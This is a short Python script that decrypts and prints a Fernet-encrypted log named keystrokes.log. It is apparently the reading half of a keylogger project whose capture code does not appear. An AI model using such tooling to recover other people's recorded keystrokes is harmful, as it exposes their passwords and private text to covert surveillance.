from cryptography.fernet import Fernet
from encrypt_util import load_key, decrypt_data
import json
import os

config_path = os.path.join(os.path.dirname(__file__), 'config.json')
with open(config_path) as f:
    config = json.load(f)

fernet = load_key(config["encryption_key"])

log_path = os.path.join(os.path.dirname(__file__), "logs", "keystrokes.log")
with open(log_path, "r") as f:
    for line in f:
        try:
            timestamp_part = line.split(']')[0][1:]
            encrypted_part = line.split(']')[1].strip()

            decrypted = decrypt_data(fernet, encrypted_part)

            print(f"[{timestamp_part}] {decrypted}")

        except Exception as e:
            print(f"Error decrypting line: {line.strip()} | Error: {e}")
